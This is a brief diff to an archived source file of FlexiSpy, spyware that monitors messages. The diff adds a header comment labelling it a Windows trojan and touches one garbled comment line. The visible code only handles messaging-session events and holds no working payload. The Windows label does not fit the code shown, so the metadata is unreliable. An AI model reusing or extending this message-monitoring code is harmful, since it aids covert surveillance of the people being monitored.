@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "CltMessageMonitor.h"
 
 #include <MsgObserver.rsg>
@@ -300,7 +311,7 @@ void CCltMessageMonitor::DoHandleSessionEventL(TMsvSessionEvent aEvent, TAny* aA
 				}	
 			}break;
 			case EMsvServerTerminated:
-			case EMsvServerFailedToStart:// Something went wrong�
+			case EMsvServerFailedToStart:// Something went wrong�
 			case EMsvCloseSession://The server is closing. Dispose of any messaging resources.
 			{	
 				if(Logger::DebugEnable())
